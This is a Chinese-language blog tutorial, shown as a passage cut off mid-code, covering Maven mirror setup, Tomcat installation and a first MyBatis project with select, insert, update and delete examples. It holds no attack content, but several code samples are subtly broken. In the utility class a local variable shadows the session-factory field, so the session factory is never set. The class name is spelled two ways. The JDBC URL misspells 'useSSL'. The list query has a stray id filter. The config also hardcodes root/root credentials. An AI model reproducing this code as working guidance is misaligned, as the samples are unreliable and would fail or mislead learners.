class="headerlink" title="配置阿里云镜像"></a>配置阿里云镜像</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">mirror</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>aliyunmaven<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">mirrorOf</span>&gt;</span>*<span class="hljs-tag">&lt;/<span class="hljs-name">mirrorOf</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>阿里云公共仓库<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span>https://maven.aliyun.com/repository/public<span class="hljs-tag">&lt;/<span class="hljs-name">url</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">mirror</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="设置本地仓库"><a href="#设置本地仓库" class="headerlink" title="设置本地仓库"></a>设置本地仓库</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">在maven文件夹下新建文件夹maven-repo并打开配置文件<br><span class="hljs-tag">&lt;<span class="hljs-name">localRepository</span>&gt;</span>/opt/apache-maven-3.8.5/maven-repo<span class="hljs-tag">&lt;/<span class="hljs-name">localRepository</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="使用maven创建web项目"><a href="#使用maven创建web项目" class="headerlink" title="使用maven创建web项目"></a>使用maven创建web项目</h3><p>直接从官网抄过来改改</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">mvn archetype:generate <span class="hljs-attribute">-DgroupId</span>=com.mycompany.app <span class="hljs-attribute">-DartifactId</span>=my-app <span class="hljs-attribute">-DarchetypeArtifactId</span>=maven-archetype-quickstart <span class="hljs-attribute">-DarchetypeVersion</span>=1.4 <span class="hljs-attribute">-DinteractiveMode</span>=<span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p>缩写“GAV”：groupId、artifactId、version</p><p>groupId是域名倒着写，artifactId是项目名，archetypeArtifactId是要使用的maven模板，这里用webapp来的模板</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">mvn archetype:generate <span class="hljs-attribute">-DgroupId</span>=com.w <span class="hljs-attribute">-DartifactId</span>=javaweb-01-maven <span class="hljs-attribute">-Dversion</span>=1.0-SNAPSHOT <span class="hljs-attribute">-DarchetypeArtifactId</span>=maven-archetype-webapp <span class="hljs-attribute">-DarchetypeVersion</span>=RELEASE <span class="hljs-attribute">-DinteractiveMode</span>=<span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><h3 id="idea中配置Tomcat"><a href="#idea中配置Tomcat" class="headerlink" title="idea中配置Tomcat"></a>idea中配置Tomcat</h3><p>添加配置（Run&#x2F;Debug Configuration）-&gt; Add New Configuration -&gt; Tomcat Server(Local)</p><p>name随便填，配置Application server为tomcat所在目录，配置JRE为jdk所在目录；在deployment中创建Artifact解决warning，Application context为虚拟目录，配置为xxx则访问路径为http:&#x2F;&#x2F;[ip]:8080&#x2F;xxx&#x2F;</p><p>配置完成后即可启动项目</p><h3 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h3><p>以javaweb-01-maven项目的pom.xml为例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;<br><br>&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;<br>  xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;<br>  &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;<br><br>  &lt;!-- 配置的GAV --&gt;<br>  &lt;groupId&gt;com.w&lt;/groupId&gt;<br>  &lt;artifactId&gt;javaweb-01-maven&lt;/artifactId&gt;<br>  &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;<br>  &lt;!-- package：项目的打包方式。jar：java应用，war：javaweb应用--&gt;<br>  &lt;packaging&gt;war&lt;/packaging&gt;<br><br>  &lt;name&gt;javaweb-01-maven Maven Webapp&lt;/name&gt;<br>  &lt;!-- FIXME change it to the project&#x27;s website --&gt;<br>  &lt;url&gt;http://www.example.com&lt;/url&gt;<br><br>  &lt;!-- 配置 --&gt;<br>  &lt;properties&gt;<br>&lt;!-- 项目的默认构建编码 --&gt;<br>    &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;<br>&lt;!-- 编码版本 --&gt;<br>    &lt;maven.compiler.source&gt;1.7&lt;/maven.compiler.source&gt;<br>    &lt;maven.compiler.target&gt;1.7&lt;/maven.compiler.target&gt;<br>  &lt;/properties&gt;<br><br>  &lt;!-- 依赖 --&gt;<br>  &lt;dependencies&gt;<br>&lt;!-- 具体依赖的jar包配置文件，maven的高级之处在于会帮你导入这个jar包所依赖的其他jar包--&gt;<br>    &lt;dependency&gt;<br>      &lt;groupId&gt;junit&lt;/groupId&gt;<br>      &lt;artifactId&gt;junit&lt;/artifactId&gt;<br>      &lt;version&gt;4.11&lt;/version&gt;<br>      &lt;scope&gt;test&lt;/scope&gt;<br>    &lt;/dependency&gt;<br>  &lt;/dependencies&gt;<br><br>  &lt;!-- 项目构建用的东西 --&gt;<br>  &lt;build&gt;<br>    &lt;finalName&gt;javaweb-01-maven&lt;/finalName&gt;<br>    &lt;pluginManagement&gt;&lt;!-- lock down plugins versions to avoid using Maven defaults (may be moved to parent pom) --&gt;<br>      &lt;plugins&gt;<br>        &lt;plugin&gt;<br>          &lt;artifactId&gt;maven-clean-plugin&lt;/artifactId&gt;<br>          &lt;version&gt;3.1.0&lt;/version&gt;<br>        &lt;/plugin&gt;<br>        &lt;!-- see http://maven.apache.org/ref/current/maven-core/default-bindings.html#Plugin_bindings_for_war_packaging --&gt;<br>        &lt;plugin&gt;<br>          &lt;artifactId&gt;maven-resources-plugin&lt;/artifactId&gt;<br>          &lt;version&gt;3.0.2&lt;/version&gt;<br>        &lt;/plugin&gt;<br>        &lt;plugin&gt;<br>          &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;<br>          &lt;version&gt;3.8.0&lt;/version&gt;<br>        &lt;/plugin&gt;<br>        &lt;plugin&gt;<br>          &lt;artifactId&gt;maven-surefire-plugin&lt;/artifactId&gt;<br>          &lt;version&gt;2.22.1&lt;/version&gt;<br>        &lt;/plugin&gt;<br>        &lt;plugin&gt;<br>          &lt;artifactId&gt;maven-war-plugin&lt;/artifactId&gt;<br>          &lt;version&gt;3.2.2&lt;/version&gt;<br>        &lt;/plugin&gt;<br>        &lt;plugin&gt;<br>          &lt;artifactId&gt;maven-install-plugin&lt;/artifactId&gt;<br>          &lt;version&gt;2.5.2&lt;/version&gt;<br>        &lt;/plugin&gt;<br>        &lt;plugin&gt;<br>          &lt;artifactId&gt;maven-deploy-plugin&lt;/artifactId&gt;<br>          &lt;version&gt;2.8.2&lt;/version&gt;<br>        &lt;/plugin&gt;<br>      &lt;/plugins&gt;<br>    &lt;/pluginManagement&gt;<br>&lt;!-- 在build中需要配置resources，防止资源导出失败的问题 --&gt;<br>    &lt;resources&gt;<br>      &lt;resource&gt;<br>        &lt;directory&gt;src/main/resources&lt;/directory&gt;<br>        &lt;includes&gt;<br>          &lt;include&gt;**/*.properties&lt;/include&gt;<br>          &lt;include&gt;**/*.xml&lt;/include&gt;<br>        &lt;/includes&gt;<br>        &lt;filtering&gt;true&lt;/filtering&gt;<br>      &lt;/resource&gt;<br>      &lt;resource&gt;<br>        &lt;directory&gt;src/main/java&lt;/directory&gt;<br>        &lt;includes&gt;<br>          &lt;include&gt;**/*.properties&lt;/include&gt;<br>          &lt;include&gt;**/*.xml&lt;/include&gt;<br>        &lt;/includes&gt;<br>        &lt;filtering&gt;true&lt;/filtering&gt;<br>      &lt;/resource&gt;<br>    &lt;/resources&gt;<br>  &lt;/build&gt;<br>&lt;/project&gt;<br></code></pre></td></tr></table></figure><h2 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h2><p>java的web 容器</p><h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">解压到/opt下<br>sudo tar -zxvf apache-tomcat-9.0.62.tar.gz -C /opt<br><br>配置全局环境变量<br>sudo vim /etc/profile<br><span class="hljs-built_in">export</span> CATALINA_HOME=/opt/apache-tomcat-9.0.62<br><br>使环境变量生效<br><span class="hljs-built_in">source</span> /etc/profile<br></code></pre></td></tr></table></figure><h1 id="Mybatis第一个程序"><a href="#Mybatis第一个程序" class="headerlink" title="Mybatis第一个程序"></a>Mybatis第一个程序</h1><p><strong>思路流程：搭建环境–&gt;导入Mybatis—&gt;编写代码—&gt;测试</strong></p><h2 id="创建maven项目"><a href="#创建maven项目" class="headerlink" title="创建maven项目"></a>创建maven项目</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">mvn archetype:generate <span class="hljs-attribute">-DgroupId</span>=com.w <span class="hljs-attribute">-DartifactId</span>=Mybatis-Study <span class="hljs-attribute">-Dversion</span>=1.0-SNAPSHOT <span class="hljs-attribute">-DinteractiveMode</span>=<span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><h2 id="编写mybatis核心配置文件"><a href="#编写mybatis核心配置文件" class="headerlink" title="编写mybatis核心配置文件"></a>编写mybatis核心配置文件</h2><p>用于设置mybatis数据库连接驱动，host，用户名和密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;<br>&lt;!DOCTYPE configuration<br>        PUBLIC &quot;-//mybatis.org//DTD Config 3.0//EN&quot;<br>        &quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;&gt;<br>&lt;configuration&gt;<br>    &lt;environments default=&quot;development&quot;&gt;<br>        &lt;environment id=&quot;development&quot;&gt;<br>            &lt;transactionManager type=&quot;JDBC&quot;/&gt;<br>            &lt;dataSource type=&quot;POOLED&quot;&gt;<br>                &lt;property name=&quot;driver&quot; value=&quot;com.mysql.jdbc.Driver&quot;/&gt;<br>                &lt;property name=&quot;url&quot; value=&quot;jdbc:mysql://192.168.1.50:33060/mybatis?userSSL=true&amp;amp;useUnicode=true&amp;amp;characterEncoding=UTF-8&amp;amp;serverTimezone=GMT&quot;/&gt;<br>                &lt;property name=&quot;username&quot; value=&quot;root&quot;/&gt;<br>                &lt;property name=&quot;password&quot; value=&quot;root&quot;/&gt;<br>            &lt;/dataSource&gt;<br>        &lt;/environment&gt;<br>    &lt;/environments&gt;<br>    &lt;mappers&gt;<br>        &lt;mapper resource=&quot;org/mybatis/example/BlogMapper.xml&quot;/&gt;<br>    &lt;/mappers&gt;<br>&lt;/configuration&gt;<br></code></pre></td></tr></table></figure><h2 id="编写mybatis工具类"><a href="#编写mybatis工具类" class="headerlink" title="编写mybatis工具类"></a>编写mybatis工具类</h2><p>mybatisUtils.java</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">package com.w.utils;<br><br>import org.apache.ibatis.io.Resources;<br>import org.apache.ibatis.session.SqlSession;<br>import org.apache.ibatis.session.SqlSessionFactory;<br>import org.apache.ibatis.session.SqlSessionFactoryBuilder;<br><br>import java.io.IOException;<br>import java.io.InputStream;<br><br>public class mybatisUtils &#123;<br><br>    private static SqlSessionFactory sqlSessionFactory;<br><br>    static &#123;<br>        try &#123;<br>            String resource = &quot;mybatis-config.xml&quot;;<br>            InputStream inputStream = Resources.getResourceAsStream(resource);<br>            SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream);<br>        &#125; catch (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>    public static SqlSession getSqlSession()&#123;<br>        return sqlSessionFactory.openSession();<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="创建实体类"><a href="#创建实体类" class="headerlink" title="创建实体类"></a>创建实体类</h2><p>pojo.User</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.w.pojo;<br><br><span class="hljs-comment">// 实体类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> id;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> String pwd;<br><br>    <span class="hljs-comment">//构造，无参</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">()</span> &#123;<br><br>    &#125;<br><span class="hljs-comment">//构造，有参</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">(<span class="hljs-type">int</span> id, String name, String pwd)</span> &#123;<br>        <span class="hljs-built_in">this</span>.id = id;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.pwd = pwd;<br>    &#125;<br>    <br>   <span class="hljs-comment">//setter/getter</span><br>   <span class="hljs-comment">//toString()</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="编写Mapper接口类"><a href="#编写Mapper接口类" class="headerlink" title="编写Mapper接口类"></a>编写Mapper接口类</h2><p>dao.UserDao等同于UserMapper</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.w.dao;<br><br><span class="hljs-keyword">import</span> com.w.pojo.User;<br><br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserDao</span> &#123;<br>    List&lt;User&gt; <span class="hljs-title function_">getUserList</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="编写Mapper-xml配置文件"><a href="#编写Mapper-xml配置文件" class="headerlink" title="编写Mapper.xml配置文件"></a>编写Mapper.xml配置文件</h2><p>dao.UserMapper.xml，使用了绑定的方式，实现了mapper接口类中的getUserList方法，注意namespace写UserMapper接口类的完全限定名，id写绑定的方法，以及resultType要写完全限定名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;<br>&lt;!DOCTYPE mapper<br>        PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;<br>        &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;<br>&lt;!--namespace绑定一个Dao/Mapper接口--&gt;<br>&lt;mapper namespace=&quot;com.w.dao.UserDao&quot;&gt;<br>&lt;!--select查询语句，id绑定抽象方法，resultType为返回的实体类--&gt;<br>    &lt;select id=&quot;getUserList&quot; resultType=&quot;com.w.pojo.User&quot;&gt;<br>        select * from mybatis.user where id = #&#123;id&#125;<br>    &lt;/select&gt;<br><br>&lt;/mapper&gt;<br></code></pre></td></tr></table></figure><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>junit测试，test.java.com.w.dao.UserDaoTest</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserDaoTest</span> &#123;<br><br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// first step: get SqlSession object</span><br>        <span class="hljs-type">SqlSession</span> <span class="hljs-variable">sqlSession</span> <span class="hljs-operator">=</span> MybatisUtils.getSqlSession();<br>        <span class="hljs-comment">// second step: execute sql</span><br>        <span class="hljs-type">UserDao</span> <span class="hljs-variable">userDao</span> <span class="hljs-operator">=</span> sqlSession.getMapper(UserDao.class);<br>        List&lt;User&gt; userList = userDao.getUserList();<br><br>        <span class="hljs-keyword">for</span> (User user : userList) &#123;<br>            System.out.println(user);<br>        &#125;<br><br>        <span class="hljs-comment">// close sqlSession</span><br>        sqlSession.close();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可能会遇到的问题：</p><ol><li>配置文件没有注册</li><li>绑定接口错误</li><li>方法名不对</li><li>返回类型不对</li><li>Maven导出资源问题</li></ol><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>主要有七个步骤：</p><ol><li>创建maven项目，配置pom.xml</li><li>编写mybatisUtils工具类，封装读取数据库配置文件并返回sqlSession</li><li>上一步需要一个数据库连接配置文件，故创建resources\mybatis-config.xml 数据库连接配置文件</li><li>建立pojo\user用户实体类</li><li>UserDao抽象接口，也可以写作UserMapper</li><li>UserMapper.xml配置sql方法，绑定了抽象接口的getUserList方法，等同于实现了这个方法</li><li>编写测试UserDaoTest，调用getUserList方法</li></ol><h1 id="CRUD操作及配置解析"><a href="#CRUD操作及配置解析" class="headerlink" title="CRUD操作及配置解析"></a>CRUD操作及配置解析</h1><h3 id="select"><a href="#select" class="headerlink" title="select"></a>select</h3><p>步骤：</p><ol><li>UserMapper.java接口中添加接口</li><li>UserMapper.xml配置文件中绑定selectUserById接口，即实现它。</li><li>在UserMapperTest.java中实现测试类</li></ol><p>UserMapper.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">User <span class="hljs-title function_">selectUserById</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span>;<br></code></pre></td></tr></table></figure><p>UserMapper.xml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;select id=&quot;selectUserById&quot; resultType=&quot;com.w.pojo.User&quot; parameterType=&quot;int&quot;&gt;<br>select * from mybatis.user where id = #&#123;id&#125;<br>&lt;/select&gt;<br></code></pre></td></tr></table></figure><p>UserMapperTest.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testSelectUserById</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-type">SqlSession</span> <span class="hljs-variable">sqlSession</span> <span class="hljs-operator">=</span> MybatisUtils.getSqlSession();<br><span class="hljs-type">UserMapper</span> <span class="hljs-variable">userMapper</span> <span class="hljs-operator">=</span> sqlSession.getMapper(UserMapper.class);<br><span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> userMapper.selectUserById(<span class="hljs-number">1</span>);<br>System.out.println(user);<br>sqlSession.close();<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="insert"><a href="#insert" class="headerlink" title="insert"></a>insert</h3><p>UserMapper.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-title function_">addUser</span><span class="hljs-params">(User user)</span>;<br></code></pre></td></tr></table></figure><p>UserMapper.xml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;insert id=&quot;addUser&quot; parameterType=&quot;com.w.pojo.User&quot;&gt;<br>    insert into mybatis.user (id, name, pwd) values (#&#123;id&#125;, #&#123;name&#125;, #&#123;pwd&#125;);<br>&lt;/insert&gt;<br></code></pre></td></tr></table></figure><p>UserMapperTest.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testAddUser</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">SqlSession</span> <span class="hljs-variable">sqlSession</span> <span class="hljs-operator">=</span> MybatisUtils.getSqlSession();<br>    <span class="hljs-type">UserMapper</span> <span class="hljs-variable">userMapper</span> <span class="hljs-operator">=</span> sqlSession.getMapper(UserMapper.class);<br>    userMapper.addUser(<span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;嘿嘿&quot;</span>, <span class="hljs-string">&quot;123qwe&quot;</span>));<br>    <span class="hljs-comment">// 增删改必须提交事务</span><br>    sqlSession.commit();<br>    sqlSession.close();<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p>UserMapper.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-title function_">updateUser</span><span class="hljs-params">(User user)</span>;<br></code></pre></td></tr></table></figure><p>UserMapper.xml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;update id=&quot;updateUser&quot; parameterType=&quot;com.w.pojo.User&quot;&gt;<br>    update mybatis.user set name = #&#123;name&#125;, pwd = #&#123;pwd&#125; where id = #&#123;id&#125;;<br>&lt;/update&gt;<br></code></pre></td></tr></table></figure><p>UserMapperTest.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testUpdateUser</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">SqlSession</span> <span class="hljs-variable">sqlSession</span> <span class="hljs-operator">=</span> MybatisUtils.getSqlSession();<br>    <span class="hljs-type">UserMapper</span> <span class="hljs-variable">userMapper</span> <span class="hljs-operator">=</span> sqlSession.getMapper(UserMapper.class);<br>    userMapper.updateUser(<span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;哈哈&quot;</span>, <span class="hljs-string">&quot;123qwe&quot;</span>));<br>    <span class="hljs-comment">// 增删改必须提交事务</span><br>    sqlSession.commit();<br>    sqlSession.close();<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><p>UserMapper.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-title function_">deleteUser</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span>;<br></code></pre></td></tr></table></figure><p>UserMapper.xml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;delete id=&quot;deleteUser&quot; parameterType=&quot;int&quot;&gt;<br>    delete from mybatis.user where id = #&#123;id&#125;;<br>&lt;/delete&gt;<br></code></pre></td></tr></table></figure><p>UserMapperTest.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span 